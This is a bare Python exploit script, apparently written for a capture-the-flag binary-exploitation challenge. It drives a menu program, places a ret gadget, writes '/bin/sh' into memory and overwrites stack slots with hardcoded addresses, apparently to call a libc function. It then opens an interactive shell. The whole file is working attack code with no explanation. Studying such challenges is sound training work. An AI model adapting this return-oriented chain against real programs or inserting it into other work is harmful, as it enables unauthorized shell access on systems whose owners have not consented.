import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
print(p.readuntil("name"))
p.sendline("zamnzamn")
print(p.readuntil("Choice:"))
p.sendline("1")
print(p.readuntil("Gadget: { ret }"))
p.sendline("1")
print(p.readuntil("at?"))
p.sendline("88")
print(p.readuntil("Choice:"))
p.sendline("2")
print(p.readuntil("Index:"))
p.sendline("120")
print(p.readuntil("String:"))
p.sendline("/bin/sh")
print(p.readuntil("Choice:"))
p.sendline("4")
print(p.readuntil("Choice:"))
p.sendline("3")
print(p.readuntil("Index:"))
p.sendline("96")
print(p.readuntil("Hex):"))
p.sendline("0x7fffffffedf8")
print(p.readuntil("Choice:"))
p.sendline("3")
print(p.readuntil("Index:"))
p.sendline("104")
print(p.readuntil("Hex):"))
p.sendline("0x7f000026d390")
# data = p.readuntil('\n')
# p.sendline('hello')

p.interactive()
